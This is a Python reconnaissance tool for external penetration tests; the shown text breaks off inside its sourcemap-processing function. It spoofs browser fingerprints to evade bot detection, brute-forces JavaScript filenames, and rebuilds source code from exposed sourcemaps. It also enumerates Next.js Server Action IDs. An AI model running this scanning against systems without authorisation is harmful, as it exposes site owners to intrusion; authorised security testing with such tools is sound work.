#!/usr/bin/env python3
"""
js_recon.py — JS recon tool for external pentest
Usage: python3 js_recon.py -f subdomains.txt [-w wordlist.txt] [-t 10] [-o output]
"""

import asyncio
import os
import shutil
import argparse
import sys
import re
import json
import base64
import threading
import urllib.request
import httpx
from pathlib import Path
from urllib.parse import urlparse, urljoin
from playwright.async_api import async_playwright

# ── HTTP Timeouts ─────────────────────────────────────────
# Split connect/read to avoid hanging on servers that accept but don't respond
_T_FAST   = httpx.Timeout(connect=4.0, read=6.0,  write=4.0, pool=4.0)  # brute/probe
_T_NORMAL = httpx.Timeout(connect=5.0, read=10.0, write=5.0, pool=5.0)  # downloads/maps

# ── ANSI Colors ───────────────────────────────────────────
_C_RED    = "[91m"
_C_YELLOW = "[93m"
_C_CYAN   = "[96m"
_C_GREEN  = "[92m"
_C_BOLD   = "[1m"
_C_DIM    = "[2m"
_C_RESET  = "[0m"

def _c(color: str, text: str) -> str:
    return f"{color}{text}{_C_RESET}"

# Per-coroutine domain prefix via contextvars (safe for parallel execution)
import contextvars
from concurrent.futures import ProcessPoolExecutor
_PREFIX_VAR: contextvars.ContextVar[str] = contextvars.ContextVar("prefix", default="")

def _pfx() -> str:
    p = _PREFIX_VAR.get()
    return f"{_c(_C_DIM, '[' + p + ']')} " if p else "  "

def _ok(msg: str):   print(f"{_pfx()}{_c(_C_GREEN,  '[+]')} {msg}")
def _hit(msg: str):  print(f"{_pfx()}{_c(_C_YELLOW, '[!]')} {msg}")
def _info(msg: str): print(f"{_pfx()}{_c(_C_CYAN,   '[*]')} {msg}")

def _map(method: str, src: str, dst):
    label = f"{_C_YELLOW}{_C_BOLD}[map:{method}]{_C_RESET}"
    print(f"{_pfx()}{label} {src}")
    print(f"{_pfx()}       → {_c(_C_DIM, str(dst))}")

def _src(n: int, dst):
    label = f"{_C_GREEN}{_C_BOLD}[src]{_C_RESET}"
    print(f"{_pfx()}{label} Extracted {_c(_C_GREEN, str(n))} source file(s) → {_c(_C_DIM, str(dst))}")


# #region debug-point A:runtime-event
def _debug_event(hypothesis_id: str, message: str, data: dict | None = None):
    def send():
        try:
            env_path = Path(".dbg/cloud-megafon-headless.env")
            config = {}
            if env_path.is_file():
                config = dict(line.split("=", 1) for line in env_path.read_text().splitlines() if "=" in line)
            payload = json.dumps({
                "sessionId": config.get("DEBUG_SESSION_ID", "cloud-megafon-headless"),
                "runId": "pre-fix",
                "hypothesisId": hypothesis_id,
                "location": "ai-jsrecon.py",
                "msg": f"[DEBUG] {message}",
                "data": data or {},
            }).encode()
            request = urllib.request.Request(
                config.get("DEBUG_SERVER_URL", "http://127.0.0.1:7777/event"),
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(request, timeout=1).read()
        except Exception:
            pass
    threading.Thread(target=send, daemon=True).start()
# #endregion


# ─── Default JS wordlist (filename brute) ────────────────────────────────────
# Common Next.js page routes for /_next/data/ brute fallback
NEXT_DATA_WORDLIST = [
    "index", "home", "about", "contact", "faq", "pricing",
    "login", "signin", "signup", "register", "logout",
    "dashboard", "profile", "account", "settings", "preferences",
    "admin", "users", "user", "orders", "order", "products", "product",
    "blog", "posts", "post", "news", "articles", "article",
    "search", "results", "catalog", "category", "categories",
    "cart", "checkout", "payment", "invoice", "invoices",
    "api", "docs", "documentation", "help", "support",
    "terms", "privacy", "cookies", "legal",
    "404", "500", "error",
]

DEFAULT_WORDLIST = [
    "app", "main", "index", "bundle", "chunk", "vendor", "runtime",
    "common", "utils", "helpers", "config", "api", "auth", "login",
    "dashboard", "admin", "core", "init", "setup", "polyfills",
    "components", "routes", "store", "router", "app.min", "main.min",
    "bundle.min", "vendor.min", "all", "lib", "framework", "jquery",
    "react", "angular", "vue", "bootstrap", "scripts", "static",
    "assets", "dist", "build", "prod", "dev", "sw", "service-worker",
    "worker", "module", "entry", "app-bundle", "client",
]

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# ─── Helpers ─────────────────────────────────────────────────────────────────

def parse_headers(raw: list[str] | None) -> dict:
    """Convert ['Name: value', 'Name2: value2'] → {'Name': 'value', 'Name2': 'value2'}"""
    result = {}
    if not raw:
        return result
    for h in raw:
        if ":" not in h:
            continue
        key, _, val = h.partition(":")
        result[key.strip()] = val.strip()
    return result


def normalize(subdomain: str) -> str:
    """Ensure subdomain has an https:// scheme; try http as fallback later."""
    subdomain = subdomain.strip()
    if not subdomain:
        return ""
    if not subdomain.startswith(("http://", "https://")):
        return f"https://{subdomain}"
    return subdomain


def base_dir_of(url: str) -> str:
    """Return the directory part of a URL path. /static/js/app.js → /static/js/"""
    parsed = urlparse(url)
    path = parsed.path
    directory = path.rsplit("/", 1)[0] + "/"
    return f"{parsed.scheme}://{parsed.netloc}{directory}"


def domain_slug(url: str) -> str:
    return urlparse(url).netloc.replace(":", "_")


def is_domain_processed(output_dir: Path, raw: str) -> bool:
    url = normalize(raw)
    if not url:
        _debug_event("A", "domain rejected during normalization", {"raw": raw})
        return False

    report_path = output_dir / domain_slug(url) / "domain_report.json"
    if not report_path.is_file():
        _debug_event("A", "domain has no report", {"domain": url})
        return False

    try:
        report = json.loads(report_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        _debug_event("A", "domain report unreadable", {"domain": url})
        return False

    report_domain = normalize(str(report.get("domain", "")))
    if not report_domain or domain_slug(report_domain) != domain_slug(url):
        return False

    processed = report.get("status") == "processed"
    _debug_event("A", "domain processed check", {"domain": url, "status": report.get("status"), "processed": processed})
    return processed


def is_obvious_js(url: str) -> bool:
    """Return True if the filename (without hash/version) looks like a named bundle."""
    filename = urlparse(url).path.rsplit("/", 1)[-1]
    # Strip common patterns: app.abc123.js, chunk-0a1b2c.js
    cleaned = re.sub(r"[.\-][a-f0-9]{6,}\.", ".", filename)
    stem = cleaned.rsplit(".", 1)[0].lower()
    obvious = {
        "app", "main", "index", "bundle", "vendor", "runtime",
        "chunk", "common", "utils", "core", "init", "client",
    }
    return stem in obvious or any(stem.startswith(o) for o in obvious)


# ─── Next.js Server Actions ──────────────────────────────────────────────────
# Server Actions are invoked from the client by an opaque action id. Detection
# methods (see process_server_actions):
#   html        — rendered DOM + flight data (Playwright)
#   js          — downloaded client chunks
#   sources     — sourcemap-restored sources ("use server" modules)
#   next_data   — /_next/data flight responses
#   manifest    — /_next/static/<build>/server-reference-manifest.json
#   chunk_enum  — chunks enumerated from app-build-manifest.json
#   probe       — active confirmation via POST + Next-Action header (opt-in)
#
# Client markers:
#   "$ACTION_ID_<id>"                 — form / flight-data reference
#   createServerReference("<id>")     — client reference in the JS runtime
#   registerServerReference("<id>")   — client reference with bound args
SERVER_ACTION_ID_PATTERNS = [
    ("$ACTION_ID_",             re.compile(r"\$ACTION_ID_([A-Za-z0-9_\-]{16,80})")),
    ("createServerReference",   re.compile(r"""createServerReference[^\w$]{0,6}\(?["']([A-Za-z0-9_\-]{16,80})["']""")),
    ("registerServerReference", re.compile(r"""registerServerReference[^\w$]{0,6}\(?["']([A-Za-z0-9_\-]{16,80})["']""")),
]

# Non-identifying markers — their presence proves the bundle contains SR plumbing
SERVER_ACTION_SIGNAL_PATTERNS = {
    "$ACTION_REF_":              re.compile(r"\$\$?ACTION_REF_\d+"),
    "createFormAction":          re.compile(r"createFormAction"),
    "decodeAction":              re.compile(r"decodeAction"),
    "decodeFormState":           re.compile(r"decodeFormState"),
    "next-action header":        re.compile(r"(?i)['\"]next-action['\"]"),
    "server-reference-manifest": re.compile(r"server-reference-manifest"),
    "use server directive":      re.compile(r"""["']use server["']"""),
    "flight data __next_f":      re.compile(r"__next_f"),
}

def _strip_leading_comments(text: str) -> str:
    """Skip leading whitespace and //, /* */ comments. Linear — no ReDoS."""
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if c.isspace():
            i += 1
        elif text.startswith("//", i):
            j = text.find("\n", i)
            i = n if j == -1 else j + 1
        elif text.startswith("/*", i):
            j = text.find("*/", i + 2)
            i = n if j == -1 else j + 2
        else:
            break
    return text[i:]
EXPORT_FN_RE    = re.compile(r"export\s+(?:default\s+)?(?:async\s+)?function\s+([A-Za-z_$][\w$]*)")
EXPORT_NAMED_RE = re.compile(r"export\s*\{([^}]*)\}")


def _extract_use_server_module(text: str) -> dict | None:
    """Return exported names if the source file is a `"use server"` action module."""
    head = _strip_leading_comments(text[:2000])
    if not (head.startswith('"use server"') or head.startswith("'use server'")):
        return None
    exports = set(EXPORT_FN_RE.findall(text))
    for block in EXPORT_NAMED_RE.findall(text):
        for part in block.split(","):
            name = part.strip().split(" as ")[-1].strip()
            if name and name != "default":
                exports.add(name)
    return {"exports": sorted(exports)}


def _scan_server_actions_text(text: str, source: str, label: str, into: dict,
                              signals: dict | None = None, modules: dict | None = None) -> int:
    """Extract Server Action IDs / markers from a text blob into `into` (id → record)."""
    found = 0
    for name, pattern in SERVER_ACTION_ID_PATTERNS:
        for m in pattern.finditer(text):
            action_id = m.group(1)
            if action_id in into:
                continue
            snippet = text[max(0, m.start() - 40): m.end() + 40].replace("\n", " ").strip()
            into[action_id] = {
                "id":      action_id,
                "source":  source,   # html | js | sources | next_data | manifest | chunk_enum
                "file":    label,
                "pattern": name,
                "context": snippet[:200],
            }
            found += 1
    if signals is not None:
        for name, pattern in SERVER_ACTION_SIGNAL_PATTERNS.items():
            if pattern.search(text):
                signals[name] = signals.get(name, 0) + 1
    if modules is not None and source == "sources":
        mod = _extract_use_server_module(text)
        if mod:
            modules[label] = mod
    return found



# ─── Stage 1: Playwright JS collection ───────────────────────────────────────
# Runs in a separate process via ProcessPoolExecutor to prevent event loop blocking

def _playwright_worker(
    url: str,
    timeout: int,
    custom_headers: dict | None,
    crawl_mode: str = "none",
    crawl_depth: int = 10,
) -> tuple[list[str], str | None, dict, bool, bool]:
    """
    Sync Playwright worker — runs in a subprocess.
    Returns (js_urls, build_id, cookies, is_cloudflare, page_loaded, server_actions).
    """
    import asyncio
    import traceback
    import sys
    import contextlib
    from camoufox.sync_api import Camoufox
    from urllib.parse import urlparse as _urlparse

    js_urls: list[str] = []
    page_build_id: str | None = None
    page_loaded = False
    page_actions: list = []

    # Camoufox generates a UA / Accept-Language consistent with its fingerprint,
    # so we don't override them here — a custom UA would break the spoof.
    pw_headers = dict(custom_headers or {})
    pw_headers.pop("User-Agent", None)

    browser = None
    ctx = None
    page = None
    _stack = contextlib.ExitStack()
    try:
        _debug_event("B", "browser launch started", {"url": url, "timeout": timeout, "headless": True})
        # Firefox's content sandbox needs unprivileged user namespaces, which are
        # commonly blocked (AppArmor / sandbox) — otherwise the browser fails to
        # start and Playwright hangs forever waiting for it.
        os.environ.setdefault("MOZ_DISABLE_CONTENT_SANDBOX", "1")
        os.environ.setdefault("MOZ_SANDBOX", "0")
        _humanize = os.environ.get("JSRECON_HUMANIZE", "1").lower() not in ("0", "false", "no", "off")
        browser = _stack.enter_context(Camoufox(
            headless=True,
            humanize=_humanize,
        ))
        ctx = browser.new_context(
            ignore_https_errors=True,
            extra_http_headers=pw_headers,
        )
        try:
            ctx.set_default_navigation_timeout(timeout * 1000)
            ctx.set_default_timeout(1500 if crawl_mode in ("medium", "deep") else 5000)
        except Exception:
            pass
        page = ctx.new_page()

        def on_request(req):
            u = req.url
            if u.startswith("blob:") or u in js_urls:
                return
            # Catch scripts loaded via any mechanism
            if req.resource_type == "script":
                js_urls.append(u)
            elif req.resource_type in ("fetch", "xhr", "other"):
                # Dynamic imports and fetch-loaded JS
                path = u.split("?")[0].split("#")[0]
                if path.endswith(".js") or path.endswith(".mjs") or path.endswith(".cjs"):
                    js_urls.append(u)

        page.on("request", on_request)

        def _goto(target: str, t: int | None = None) -> bool:
            started = asyncio.get_event_loop().time()
            try:
                resp = page.goto(
                    target,
                    timeout=(t or timeout) * 1000,
                    wait_until="domcontentloaded",
                )
                page.wait_for_timeout(1000)
                result = resp is not None and resp.status < 400
                _debug_event("A", "navigation completed", {"target": target, "status": resp.status if resp else None, "final_url": page.url, "ok": result, "elapsed_ms": round((asyncio.get_event_loop().time() - started) * 1000)})
                return result
            except Exception as exc:
                _debug_event("C", "navigation failed", {"target": target, "error_type": type(exc).__name__, "error": str(exc), "final_url": page.url, "elapsed_ms": round((asyncio.get_event_loop().time() - started) * 1000)})
                return False

        # For https:// targets use a short probe first (8s) so a hanging
        # TLS handshake doesn't consume the full timeout before http fallback
        https_probe_timeout = min(timeout, 8)
        ok = _goto(url, t=https_probe_timeout)
        _debug_event("A", "https navigation branch", {"url": url, "probe_timeout": https_probe_timeout, "ok": ok})
        if not ok and url.startswith("https://"):
            ok = _goto(url.replace("https://", "http://", 1))
            _debug_event("A", "http fallback branch", {"url": url.replace("https://", "http://", 1), "ok": ok})
        page_loaded = ok

        # Extract buildId from __NEXT_DATA__
        try:
            next_data = page.evaluate("""
                () => {
                    const el = document.getElementById('__NEXT_DATA__');
                    if (!el) return null;
                    try { return JSON.parse(el.textContent); } catch(e) { return null; }
                }
            """)
            if next_data and isinstance(next_data, dict):
                page_build_id = next_data.get("buildId")
        except Exception:
            pass

        # Parse HTML for <script src="..."> tags — catches JS not executed on load
        try:
            html_scripts = page.evaluate("""
                () => Array.from(document.querySelectorAll('script[src]'))
                           .map(s => s.src)
                           .filter(s => s && !s.startsWith('blob:'))
            """)
            if html_scripts:
                for s in html_scripts:
                    if s not in js_urls:
                        js_urls.append(s)
        except Exception:
            pass

        # Extract Next.js Server Action IDs from the rendered HTML / flight data
        try:
            _seen_actions: dict = {}
            _scan_server_actions_text(page.content(), "html", "index.html", _seen_actions)
            page_actions = list(_seen_actions.values())
        except Exception:
            page_actions = []

        def _collect_html_scripts():
            try:
                scripts = page.evaluate("""
                    () => Array.from(document.querySelectorAll('script[src]'))
                               .map(s => s.src)
                               .filter(s => s && !s.startsWith('blob:'))
                """)
                for s in (scripts or []):
                    if s not in js_urls:
                        js_urls.append(s)
            except Exception:
                pass

        def _crawl_medium():
            try:
                import time as _time
                deadline = _time.monotonic() + 12.0
                try:
                    page.evaluate("""
                        () => new Promise(resolve => {
                            let total = 0;
                            const limit = Math.min(document.body.scrollHeight, 5000);
                            const step = () => {
                                window.scrollBy(0, 300);
                                total += 300;
                                if (total < limit) setTimeout(step, 80);
                                else resolve();
                            };
                            step();
                        })
                    """)
                except Exception:
                    pass
                page.wait_for_timeout(500)
                _collect_html_scripts()
                for sel in ["[role=tab]","[role=menuitem]","nav a",".nav-link",
                            "button:not([type=submit]):not([disabled])",
                            "[data-toggle]","[data-bs-toggle]",".accordion-button"]:
                    if _time.monotonic() > deadline:
                        break
                    try:
                        for el in page.query_selector_all(sel)[:5]:
                            if _time.monotonic() > deadline:
                                break
                            try:
                                el.scroll_into_view_if_needed(timeout=800)
                                el.click(timeout=800, force=True, no_wait_after=True)
                                page.wait_for_timeout(250)
                                _collect_html_scripts()
                            except Exception:
                                pass
                    except Exception:
                        pass
                for el in (page.query_selector_all("nav li, .dropdown, [data-hover]") or [])[:10]:
                    if _time.monotonic() > deadline:
                        break
                    try:
                        el.hover(timeout=500)
                        page.wait_for_timeout(250)
                        _collect_html_scripts()
                    except Exception:
                        pass
            except Exception:
                pass

        def _crawl_deep():
            _crawl_medium()
            origin = _urlparse(url)
            base_origin = f"{origin.scheme}://{origin.netloc}"
            visited = {url}

            # Collect links from main page only
            try:
                links = page.evaluate("""
                    (base) => {
                        const seen = new Set();
                        return Array.from(document.querySelectorAll('a[href]'))
                            .map(a => a.href.split('?')[0].split('#')[0])
                            .filter(h => h.startsWith(base) && h !== base + '/' && !seen.has(h) && seen.add(h))
                    }
                """, base_origin)
                # Deduplicate and limit queue
                queue = []
                for l in (links or []):
                    if l not in visited and l not in queue:
                        queue.append(l)
                    if len(queue) >= crawl_depth:
                        break
            except Exception:
                queue = []

            print(f"[crawl:deep] found {len(links or [])} link(s), queued {len(queue)}")
            for l in queue[:5]:
                print(f"[crawl:deep]   → {l}")

            for i, link in enumerate(queue):
                visited.add(link)
                before = len(js_urls)
                try:
                    resp = page.goto(link, timeout=8000, wait_until="domcontentloaded")
                    if resp and resp.status < 400:
                        page.wait_for_timeout(500)
                        _collect_html_scripts()
                        new_js = len(js_urls) - before
                        print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → +{new_js} JS")
                    else:
                        status = resp.status if resp else "err"
                        print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → skip ({status})")
                except Exception:
                    print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → error")

        if crawl_mode == "medium":
            print(f"[crawl:medium] starting interaction crawl...")
            _crawl_medium()
            print(f"[crawl:medium] done, {len(js_urls)} JS total")
        elif crawl_mode == "deep":
            print(f"[crawl:deep] starting deep crawl (depth={crawl_depth})...")
            _crawl_deep()
            print(f"[crawl:deep] done, {len(js_urls)} JS total")

        # ── Cloudflare detection ──────────────────────────────
        is_cloudflare = False
        try:
            cf_headers = page.evaluate("""
                () => {
                    const metas = document.querySelectorAll('meta[name]');
                    const title = document.title || '';
                    const body = document.body ? document.body.innerText.slice(0, 500) : '';
                    return {title, body};
                }
            """)
            title = cf_headers.get('title', '').lower()
            body = cf_headers.get('body', '').lower()
            blocked_markers = [
                'just a moment', 'cloudflare', 'attention required',
                'access denied', 'request blocked', 'too many requests',
                'temporarily blocked', 'unusual traffic', 'bot detection',
            ]
            if any(x in title for x in blocked_markers):
                is_cloudflare = True
            elif any(x in body for x in [
                'checking your browser', 'cf-browser-verification',
                'access denied', 'request blocked', 'too many requests',
                'temporarily blocked', 'unusual traffic', 'bot detection',
            ]):
                is_cloudflare = True
        except Exception:
            pass

        # Check response headers via network interception result
        if not is_cloudflare:
            try:
                resp = page.evaluate("""
                    () => {
                        const cookies = document.cookie;
                        return cookies.includes('cf_clearance') || cookies.includes('__cf_bm');
                    }
                """)
                # If cf_clearance exists, we passed CF — not blocked
            except Exception:
                pass

        # ── Extract cookies for httpx reuse ───────────────────────
        session_cookies: dict = {}
        try:
            raw_cookies = ctx.cookies()
            session_cookies = {c['name']: c['value'] for c in raw_cookies}
            # Flag as cloudflare if cf cookies present
            if 'cf_clearance' in session_cookies or '__cf_bm' in session_cookies:
                is_cloudflare = True
        except Exception:
            pass

    except Exception:
        traceback.print_exc(file=sys.stderr)
    finally:
        for resource in (page, ctx):
            if resource is not None:
                try:
                    resource.close()
                except Exception:
                    pass
        try:
            _stack.close()
        except Exception:
            pass

    return js_urls, page_build_id, session_cookies, is_cloudflare, page_loaded, page_actions


async def collect_js_playwright(
    url: str,
    timeout: int = 20,
    custom_headers: dict | None = None,
    executor=None,
    crawl_mode: str = "none",
    crawl_depth: int = 10,
) -> tuple[list[str], str | None, dict, bool, bool, list]:
    """
    Async wrapper — runs _playwright_worker in a separate process.
    Runs the synchronous worker with a bounded wait.
    """
    loop = asyncio.get_running_loop()
    extra = {"none": 10, "medium": 30, "deep": 60}.get(crawl_mode, 10)
    hard_timeout = timeout + extra + 5
    try:
        result = await asyncio.wait_for(
            loop.run_in_executor(
                executor, _playwright_worker,
                url, timeout, custom_headers, crawl_mode, crawl_depth
            ),
            timeout=hard_timeout,
        )
        return result
    except asyncio.TimeoutError:
        _debug_event("C", "Playwright timeout", {"url": url, "crawl_mode": crawl_mode, "timeout": hard_timeout})
        _hit(f"Playwright hard-timeout ({hard_timeout}s) — попробуй увеличить -t/--timeout или отключить --crawl")
        return [], None, {}, False, False, []
    except Exception:
        _debug_event("B", "Playwright collection exception", {"url": url, "crawl_mode": crawl_mode})
        return [], None, {}, False, False, []


# ─── Stage 2: Brute-force sibling JS files ───────────────────────────────────

import hashlib
from uuid import uuid4

class Soft404Baseline:
    """Fingerprint of a soft-404 response for one base directory."""
    def __init__(self, status: int, size: int, body_hash: str,
                 content_type: str, final_url: str):
        self.status       = status
        self.size         = size
        self.body_hash    = body_hash
        self.content_type = content_type
        self.final_url    = final_url

    def is_soft404(self, status: int, size: int, body_hash: str,
                   content_type: str, final_url: str) -> bool:
        # Exact body hash match → definitely soft 404
        if body_hash == self.body_hash:
            return True
        # Redirected to same place as canary
        if final_url and final_url == self.final_url:
            return True
        # HTML content-type on a .js request → soft 404
        if "html" in content_type and "javascript" not in content_type:
            return True
        # Size within 2% of canary → treat as soft 404
        if self.size > 0 and abs(size - self.size) / self.size < 0.02:
            return True
        return False


async def get_soft404_baseline(
    client: httpx.AsyncClient,
    base_dir: str,
) -> Soft404Baseline | None:
    """Request a random filename that cannot exist to capture soft-404 signature."""
    canary_url = f"{base_dir}{uuid4().hex}.js"
    try:
        r = await client.get(canary_url, timeout=_T_FAST, follow_redirects=True)
        body  = r.content
        return Soft404Baseline(
            status       = r.status_code,
            size         = len(body),
            body_hash    = hashlib.md5(body).hexdigest(),
            content_type = r.headers.get("content-type", ""),
            final_url    = str(r.url),
        )
    except Exception:
        return None


async def brute_js_names(
    base_dirs: list[str],
    wordlist: list[str],
    concurrency: int = 20,
    delay: float = 0.0,
    proxy: str | None = None,
    custom_headers: dict | None = None,
) -> list[str]:
    """
    For each base directory:
      1. Probe a canary URL to fingerprint soft-404 responses
      2. Brute wordlist, skipping responses that match the canary
    """
    found: list[str] = []
    sem = asyncio.Semaphore(concurrency)

    limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
    req_headers = {"User-Agent": UA}
    if custom_headers:
        req_headers.update(custom_headers)

    client_kwargs = dict(
        verify=False,
        headers=req_headers,
        limits=limits,
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:

        # Build baselines per directory
        baselines: dict[str, Soft404Baseline | None] = {}
        for base in base_dirs:
            baselines[base] = await get_soft404_baseline(client, base)
            bl = baselines[base]
            if bl:
                verdict = "soft-404 detected" if bl.status == 200 else f"status={bl.status}"
                print(f"{_pfx()}{_c(_C_DIM, '[baseline]')} {base} → {_c(_C_YELLOW if bl.status==200 else _C_DIM, verdict)} (size={bl.size}, ct={bl.content_type.split(';')[0]})")

        async def probe(url: str, base: str):
            async with sem:
                if delay > 0:
                    await asyncio.sleep(delay)
                try:
                    r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
                    if r.status_code != 200:
                        return
                    body = r.content
                    ct   = r.headers.get("content-type", "")
                    # Must look like JS
                    if "javascript" not in ct and not url.endswith(".js"):
                        return
                    # Check against baseline
                    bl = baselines.get(base)
                    if bl is not None:
                        if bl.is_soft404(
                            status       = r.status_code,
                            size         = len(body),
                            body_hash    = hashlib.md5(body).hexdigest(),
                            content_type = ct,
                            final_url    = str(r.url),
                        ):
                            return
                    found.append(url)
                except Exception:
                    pass

        tasks = []
        seen  = set()
        for base in base_dirs:
            for name in wordlist:
                candidate = f"{base}{name}.js"
                if candidate not in seen:
                    seen.add(candidate)
                    tasks.append(probe(candidate, base))
        await asyncio.gather(*tasks)

    return found


# ─── Output helpers ───────────────────────────────────────────────────────────

def save_results(output_dir: Path, slug: str, js_list: list[str], bruted: list[str]):
    domain_dir = output_dir / slug
    domain_dir.mkdir(parents=True, exist_ok=True)

    js_file = domain_dir / "js_files.txt"
    js_file.write_text("\n".join(sorted(set(js_list))) + "\n")

    brute_file = domain_dir / "bruteforced.txt"
    brute_file.write_text("\n".join(sorted(set(bruted))) + "\n")

    return js_file, brute_file


def save_domain_report(
    domain_dir: Path,
    base_url: str,
    js_urls: list[str],
    bruted: list[str],
    is_cloudflare: bool,
    status: str,
):
    """
    Build and write a single domain_report.json that aggregates everything:
      - js_urls_playwright  : JS found by headless browser
      - js_urls_bruted      : JS found by filename brute
      - sources             : extracted source files (from sourcemaps)
      - sourcemaps          : .map files downloaded
      - vite                : vite_info.json contents if present
      - nextjs              : next_info.json contents if present
      - server_actions      : Next.js Server Action IDs (server_actions.json)
      - cloudflare          : bool
    """
    report: dict = {
        "domain":              base_url,
        "status":              status,
        "cloudflare":          is_cloudflare,
        "js_urls_playwright":  sorted(set(js_urls)),
        "js_urls_bruted":      sorted(set(bruted)),
        "sources":             [],
        "sourcemaps":          [],
        "vite":                None,
        "nextjs":              None,
        "server_actions":      {"detected": False, "count": 0, "actions": []},
    }

    # Collected source files from sourcemap extraction (absolute paths)
    sources_dir = domain_dir / "sources"
    if sources_dir.exists():
        report["sources"] = sorted(
            str(p.resolve()) for p in sources_dir.rglob("*") if p.is_file()
        )

    # Downloaded .map files (absolute paths)
    sourcemaps_dir = domain_dir / "sourcemaps"
    if sourcemaps_dir.exists():
        report["sourcemaps"] = sorted(
            str(p.resolve()) for p in sourcemaps_dir.rglob("*.map")
        )

    # Vite info (root path + CVE results + LFI files)
    vite_json = domain_dir / "vite_info.json"
    if vite_json.exists():
        try:
            report["vite"] = json.loads(vite_json.read_text(encoding="utf-8"))
        except Exception:
            pass

    # Next.js info
    next_json = domain_dir / "next_info.json"
    if next_json.exists():
        try:
            report["nextjs"] = json.loads(next_json.read_text(encoding="utf-8"))
        except Exception:
            pass

    # Next.js Server Actions
    sa_json = domain_dir / "server_actions.json"
    if sa_json.exists():
        try:
            report["server_actions"] = json.loads(sa_json.read_text(encoding="utf-8"))
        except Exception:
            pass

    # Grepper results (if grepper.py ran before this call)
    grepper_json = domain_dir / "grepper_report.json"
    if grepper_json.exists():
        try:
            report["grepper"] = json.loads(grepper_json.read_text(encoding="utf-8"))
        except Exception:
            pass

    # ── Summary flags — quick overview without parsing nested fields ──────────
    report["summary"] = {
        "js_count":        len(report["js_urls_playwright"]) + len(report["js_urls_bruted"]),
        "js_playwright":   len(report["js_urls_playwright"]),
        "js_bruted":       len(report["js_urls_bruted"]),
        "has_sources":     len(report["sources"]) > 0,
        "sources_count":   len(report["sources"]),
        "has_sourcemaps":  len(report["sourcemaps"]) > 0,
        "sourcemaps_count":len(report["sourcemaps"]),
        "has_vite":        report["vite"] is not None,
        "vite_cves":       list(report["vite"]["confirmed"].keys()) if report["vite"] and report["vite"].get("confirmed") else [],
        "vite_lfi_count":  len(report["vite"]["lfi_files"]) if report["vite"] else 0,
        "has_nextjs":      report["nextjs"] is not None,
        "nextjs_routes":   len(report["nextjs"]["routes"]) if report["nextjs"] else 0,
        "has_server_actions":   bool(report["server_actions"].get("detected")),
        "server_actions_count": report["server_actions"].get("count", 0),
        "server_actions_methods": report["server_actions"].get("methods", {}),
        "cloudflare":      report["cloudflare"],
        # grepper counts filled in by grepper.py after it runs
        "secrets_count":   0,
        "apis_count":      0,
        "sensitive_count": 0,
    }

    out = domain_dir / "domain_report.json"
    out.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    return out


def is_valid_sourcemap(data: bytes) -> bool:
    """Check if response body looks like a real source map (not a soft-404 HTML page)."""
    try:
        text = data[:512].decode("utf-8", errors="replace").strip()
    except Exception:
        return False
    # Must start with { (JSON object)
    if not text.startswith("{"):
        return False
    try:
        obj = json.loads(data)
    except Exception:
        return False
    # Must have at least 2 of: version==3, sources, mappings
    score = 0
    if obj.get("version") == 3:
        score += 1
    if isinstance(obj.get("sources"), list):
        score += 1
    if isinstance(obj.get("mappings"), str):
        score += 1
    return score >= 2


def extract_sourcemap_url(content: bytes) -> str | None:
    tail = content[-4096:]
    try:
        text = tail.decode("utf-8", errors="replace")
    except Exception:
        return None
    m = re.search(r"//[#@]\s*sourceMappingURL=([^\s]+)", text)
    return m.group(1).strip() if m else None


def extract_sourcemap_header(headers) -> str | None:
    """Check HTTP response headers for SourceMap / X-SourceMap."""
    for hdr in ("sourcemap", "x-sourcemap"):
        val = headers.get(hdr)
        if val:
            return val.strip()
    return None


def resolve_map_url(js_url: str, mapping_url: str) -> str | None:
    if mapping_url.startswith("data:"):
        return None
    if mapping_url.startswith(("http://", "https://")):
        return mapping_url
    return urljoin(js_url, mapping_url)


def safe_path(base: Path, rel: str) -> Path:
    rel = rel.lstrip("/").lstrip("../")
    rel = re.sub(r"\.\./", "", rel)
    target = (base / rel).resolve()
    if not str(target).startswith(str(base.resolve())):
        target = base / Path(rel).name
    return target


def extract_inline_map(mapping_url: str) -> dict | None:
    try:
        header, encoded = mapping_url.split(",", 1)
        if "base64" in header:
            data = base64.b64decode(encoded)
        else:
            from urllib.parse import unquote
            data = unquote(encoded).encode("utf-8")
        return json.loads(data)
    except Exception:
        return None


async def fetch_and_extract_map(
    map_url: str,
    js_filename: str,
    domain_dir: Path,
    client: httpx.AsyncClient,
    tag: str = "map",
) -> bool:
    """Download a .map URL, validate it's a real sourcemap, extract sources. Returns True on success."""
    sourcemaps_dir = domain_dir / "sourcemaps"
    sources_dir    = domain_dir / "sources"
    sourcemaps_dir.mkdir(parents=True, exist_ok=True)
    sources_dir.mkdir(parents=True, exist_ok=True)

    try:
        r = await client.get(map_url, timeout=_T_NORMAL, follow_redirects=True)
        if r.status_code != 200:
            return False
        map_raw = r.content
    except Exception:
        return False

    if not is_valid_sourcemap(map_raw):
        return False

    try:
        map_data = json.loads(map_raw)
    except Exception:
        return False

    map_path = sourcemaps_dir / f"{js_filename}.map"
    map_path.write_bytes(map_raw)
    _map(tag, map_url, map_path)

    sources  = map_data.get("sources", [])
    contents = map_data.get("sourcesContent", [])
    saved = 0
    for i, src_path in enumerate(sources):
        if not src_path:
            continue
        src_path = re.sub(r"^(webpack://[^/]*/|webpack:///|\./)", "", src_path)
        content_str = contents[i] if i < len(contents) and contents[i] is not None else None
        if content_str is None:
            continue
        dest = safe_path(sources_dir, src_path)
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_text(content_str, encoding="utf-8")
        saved += 1

    if saved:
        _src(saved, sources_dir)
    return True


async def process_sourcemap(
    js_url: str,
    js_content: bytes,
    js_resp_headers,
    domain_dir: Path,
    client: httpx.AsyncClient,
):
    js_filename = urlparse(js_url).path.rsplit("/", 1)[-1]
